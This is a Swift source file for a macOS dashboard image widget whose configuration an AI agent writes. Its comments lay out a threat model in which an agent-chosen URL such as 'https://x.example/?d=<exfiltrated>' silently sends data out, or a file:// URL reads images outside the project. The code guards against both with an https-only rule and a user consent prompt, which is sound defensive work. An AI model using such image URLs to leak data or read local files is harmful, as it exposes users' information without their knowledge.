import SwiftUI
import ScarfCore
import ScarfDesign
import AppKit
import ImageIO
import UniformTypeIdentifiers

/// Renders a local file (`path`, resolved relative to project root) or a
/// remote `url`. `path` wins when both are set. Local files refresh via the
/// project-wide `.scarf/` directory watch (v2.7); remote URLs are loaded
/// once per appearance and cached by the SwiftUI `AsyncImage` machinery.
struct ImageWidgetView: View {
    let widget: DashboardWidget

    @Environment(\.serverContext) private var serverContext
    @Environment(\.selectedProjectRoot) private var projectRoot
    @Environment(HermesFileWatcher.self) private var fileWatcher

    @State private var localImage: NSImage?
    @State private var loadError: String?
    /// `"<mtime>:<size>"` of the bytes currently decoded — a tick whose
    /// stat matches reads and decodes nothing.
    @State private var loadedSignature: String?

    /// Per-(project, host) beacon consent — see `ImageHostConsentStore`.
    /// Mirrored into `@State` so pressing Allow re-renders immediately;
    /// the store is the truth and is re-read whenever the URL changes.
    @State private var hostAllowed = false
    private let consent = ImageHostConsentStore()

    private var displayHeight: CGFloat? {
        widget.height.map { CGFloat($0) }
    }

    /// The header caption already says `widget.title` visually; reuse it as
    /// the loaded image's own name so VoiceOver doesn't land on a blank
    /// "image" stop when the outer group is walked with the rotor.
    private var imageAccessibilityLabel: Text {
        widget.title.isEmpty ? Text("Image") : Text(verbatim: widget.title)
    }

    var body: some View {
        VStack(alignment: .leading, spacing: 6) {
            HStack(spacing: 6) {
                Image(systemName: "photo")
                    .foregroundStyle(.secondary)
                    .scarfStyle(.caption)
                    .accessibilityHidden(true)
                Text(widget.title)
                    .scarfStyle(.caption)
                    .foregroundStyle(.secondary)
            }
            content
        }
        // Title + loaded image read as one VO stop instead of a "photo"
        // icon, a blank "image", and a separate caption.
        //
        // But ONLY when there is nothing to interact with. `.combine`
        // flattens its subtree into a single static element, and when the
        // beacon consent card is showing, that subtree contains the Allow
        // button — flattening it dropped the button's focusability and its
        // hint, leaving a VoiceOver or Full Keyboard Access user with a
        // security prompt they could hear and not answer. `.contain` keeps
        // the card (and its own grouping) reachable.
        .accessibilityElement(children: showsConsentCard ? .contain : .combine)
        .frame(maxWidth: .infinity, alignment: .leading)
        .padding(12)
        .background(ScarfColor.backgroundSecondary)
        .clipShape(RoundedRectangle(cornerRadius: ScarfRadius.lg))
    }

    /// Is the beacon consent card the thing on screen? Decides the outer
    /// accessibility grouping — see `body`.
    private var showsConsentCard: Bool {
        widget.path == nil && consentProjectId != nil && remoteURL != nil && !hostAllowed
    }

    @ViewBuilder
    private var content: some View {
        if let _ = widget.path {
            localContent
        } else if let parsed = remoteURL {
            if let projectId = consentProjectId {
                remoteContent(url: parsed, projectId: projectId)
            } else {
                // NO PROJECT, NO CONSENT (P8 F1-L4). This used to fall back
                // to `""`, which put every project with no resolvable root
                // into ONE shared allowlist bucket: allowing a host in any
                // of them allowed it in all of them, and a surface that
                // never had a project root could inherit an approval it was
                // never shown. There is no honest owner for a consent
                // record here, so there is no consent — the request is
                // refused rather than asked about.
                WidgetErrorCard(
                    title: "",
                    reason: "This dashboard isn't bound to a project folder, so Scarf can't ask for (or remember) permission to contact a remote image host."
                )
            }
        } else if let raw = widget.url, !raw.isEmpty {
            WidgetErrorCard(
                verbatimReason: "\(raw)\n\nOnly https:// URLs can be loaded by an image widget.",
                title: ""
            )
        } else {
            WidgetErrorCard(
                title: "",
                reason: "Image widget needs either `path` (local file relative to project root) or `url` (remote)."
            )
        }
    }

    /// The widget's remote URL, accepted only when it is `https` with a
    /// host — the same policy `WebviewWidgetView.webURL` applies, and for
    /// the same reasons, plus one this widget makes worse.
    ///
    /// `url` comes from `.scarf/dashboard.json`, which the agent writes.
    /// Unlike the webview widget, an image widget fires its request the
    /// moment the dashboard renders — no click, no visible chrome, nothing
    /// the user could decline. So the widget was:
    ///
    /// - a **beacon**: any `http(s)://…` the agent chose was fetched on
    ///   sight, reporting the user's IP, and (because the dashboard reloads
    ///   on every watcher tick) doing it repeatedly. A URL is a channel;
    ///   `https://x.example/?d=<exfiltrated>` is a GET the agent gets to make
    ///   through the user's network from the user's machine.
    /// - a **local file reader**: `AsyncImage` follows `file://`, so a
    ///   widget could pull any image on the disk into a panel the agent can
    ///   then be asked to describe — straight past `WidgetPathResolver`,
    ///   which exists precisely to keep `path` inside the project root.
    /// - **plaintext**: `http` is MITM-able into whatever bytes the attacker
    ///   likes, decoded here by the system image decoders.
    ///
    /// Refusing everything but `https` doesn't close the beacon — a widget
    /// that legitimately shows a remote image is a request either way — but
    /// it closes the local-file read and the plaintext channel, and it makes
    /// this widget no more permissive than the webview one beside it.
    private var remoteURL: URL? {
        guard let raw = widget.url,
              let url = URL(string: raw),
              url.scheme?.lowercased() == "https",
              let host = url.host, !host.isEmpty
        else { return nil }
        return url
    }

    @ViewBuilder
    private var localContent: some View {
        switch WidgetPathResolver.resolve(widget.path, projectRoot: projectRoot) {
        case .failure(let err):
            WidgetErrorCard(verbatimReason: err.userMessage, title: "")
        case .success(let resolved):
            Group {
                if let img = localImage {
                    Image(nsImage: img)
                        .resizable()
                        .scaledToFit()
                        .frame(maxWidth: .infinity, maxHeight: displayHeight)
                        .clipShape(RoundedRectangle(cornerRadius: ScarfRadius.sm))
                        .accessibilityLabel(imageAccessibilityLabel)
                } else if let loadError {
                    Text(loadError)
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } else {
                    ProgressView().controlSize(.small)
                }
            }
            .task(id: "\(resolved)|\(fileWatcher.lastChangeDate.timeIntervalSince1970)") {
                await loadLocal(absPath: resolved)
            }
        }
    }

    /// Nothing is fetched until the user says so (P8 SEC-M4). The gate is
    /// keyed on the project and the URL's host, so a dashboard the user has
    /// blessed doesn't re-ask on every watcher tick, and an agent that
    /// changes the PATH doesn't get a fresh unconsented request.
    @ViewBuilder
    private func remoteContent(url: URL, projectId: String) -> some View {
        if hostAllowed {
            remoteImage(url: url)
        } else {
            beaconConsentCard(url: url, projectId: projectId)
        }
    }

    private func beaconConsentCard(url: URL, projectId: String) -> some View {
        let host = ImageHostConsentStore.normalizedHost(url) ?? ""
        return VStack(alignment: .leading, spacing: 8) {
            HStack(spacing: 6) {
                Image(systemName: "eye.trianglebadge.exclamationmark")
                    .foregroundStyle(ScarfColor.warning)
                    .accessibilityHidden(true)
                Text("This widget wants to load an image from \(host).")
                    .font(.callout)
            }
            Text("Loading it contacts that server from your Mac and tells it your IP address. The dashboard file that asks for this is written by the agent.")
                .font(.caption)
                .foregroundStyle(.secondary)
                .fixedSize(horizontal: false, vertical: true)
            HStack {
                Button("Allow \(host)") {
                    consent.allow(url: url, projectId: projectId)
                    hostAllowed = true
                }
                .buttonStyle(.bordered)
                .accessibilityHint("Lets this project's dashboard load images from this host from now on")
                Spacer()
            }
        }
        .frame(maxWidth: .infinity, alignment: .leading)
        .padding(10)
        .background(ScarfColor.backgroundTertiary)
        .clipShape(RoundedRectangle(cornerRadius: ScarfRadius.sm))
        // One VO stop: the ask, the consequence, and the button's own.
        .accessibilityElement(children: .contain)
        .task(id: url.absoluteString + "|" + projectId) {
            hostAllowed = consent.isAllowed(url: url, projectId: projectId)
        }
    }

    /// The project this consent belongs to, or `nil` when this surface has
    /// no project root — in which case there is nothing to key a consent
    /// record on and remote images are refused outright (see `content`).
    ///
    /// The widget surface has the project ROOT to hand, which is exactly the
    /// id `ProjectStore` derives project identity from, and is stable across
    /// renames of the display name. It is a PATH, though, so a registry row
    /// rewritten onto a previously-blessed path inherits its allowlist —
    /// see `ImageHostConsentStore`.
    private var consentProjectId: String? {
        guard let projectRoot, !projectRoot.isEmpty else { return nil }
        return projectRoot
    }

    private func remoteImage(url: URL) -> some View {
        AsyncImage(url: url) { phase in
            switch phase {
            case .empty:
                ProgressView().controlSize(.small)
            case .success(let img):
                img.resizable()
                    .scaledToFit()
                    .frame(maxWidth: .infinity, maxHeight: displayHeight)
                    .clipShape(RoundedRectangle(cornerRadius: ScarfRadius.sm))
                    .accessibilityLabel(imageAccessibilityLabel)
            case .failure(let err):
                Text("Could not load image: \(err.localizedDescription)")
                    .font(.caption)
                    .foregroundStyle(.secondary)
            @unknown default:
                EmptyView()
            }
        }
    }

    private func loadLocal(absPath: String) async {
        let context = serverContext
        let known = loadedSignature
        let hasImage = localImage != nil
        // The panel this draws into is a few hundred points wide, and the
        // file is agent-written — a 6000px screenshot decoded at full size
        // is ~140 MB of backing store to show a thumbnail, every time.
        let target = (displayHeight ?? 400) * 3
        let outcome: (result: WidgetIOResult<NSImage>?, signature: String?) =
            await Task.detached {
                let transport = context.makeTransport()
                // STAT FIRST — see `MarkdownFileWidgetView.reload`. Decoding
                // is the expensive half here, so skipping it matters even on
                // a local context.
                let signature = WidgetFileRead.signature(absPath, transport: transport)
                if let signature, signature == known, hasImage { return (nil, signature) }
                // Measures disk/transport latency for reading the image file.
                let read = ScarfMon.measure(.diskIO, "widget.image.load") {
                    WidgetFileRead.read(
                        absPath, cap: WidgetFileRead.maxImageBytes, transport: transport
                    )
                }
                switch read {
                case .failure(let err):
                    return (.failure(err.message), signature)
                case .success(let data):
                    if let img = Self.decode(data, maxPixelSize: target) {
                        return (.success(img), signature)
                    }
                    return (.failure("File is not a recognized image format."), signature)
                }
            }.value
        // GENERATION GUARD — see `LogTailWidgetView.reload`. `.task(id:)`
        // cancellation does not stop a suspended `await` from resuming, and
        // the detached read does not inherit cancellation at all.
        guard !Task.isCancelled else { return }
        guard let result = outcome.result else { return }
        self.loadedSignature = outcome.signature
        switch result {
        case .success(let img):
            self.localImage = img
            self.loadError = nil
        case .failure(let err):
            self.localImage = nil
            self.loadError = err.message
        }
    }

    /// Decode `data` to at most `maxPixelSize` on its longest edge.
    ///
    /// `NSImage(data:)` keeps the full-resolution representation alive for
    /// as long as the widget is on screen, whatever size it is drawn at.
    /// `CGImageSourceCreateThumbnailAtIndex` decodes straight to the size
    /// we will actually draw, so a large source costs its file bytes and
    /// then a small bitmap rather than a large one. Falls back to the plain
    /// decode when the source can't produce a thumbnail (an image format
    /// ImageIO reads but won't thumbnail).
    nonisolated private static func decode(_ data: Data, maxPixelSize: CGFloat) -> NSImage? {
        guard maxPixelSize > 0,
              let source = CGImageSourceCreateWithData(data as CFData, nil)
        else { return NSImage(data: data) }
        let options: [CFString: Any] = [
            kCGImageSourceCreateThumbnailFromImageAlways: true,
            kCGImageSourceCreateThumbnailWithTransform: true,
            kCGImageSourceShouldCacheImmediately: true,
            kCGImageSourceThumbnailMaxPixelSize: Int(maxPixelSize)
        ]
        guard let cg = CGImageSourceCreateThumbnailAtIndex(source, 0, options as CFDictionary) else {
            return NSImage(data: data)
        }
        return NSImage(cgImage: cg, size: NSSize(width: cg.width, height: cg.height))
    }
}
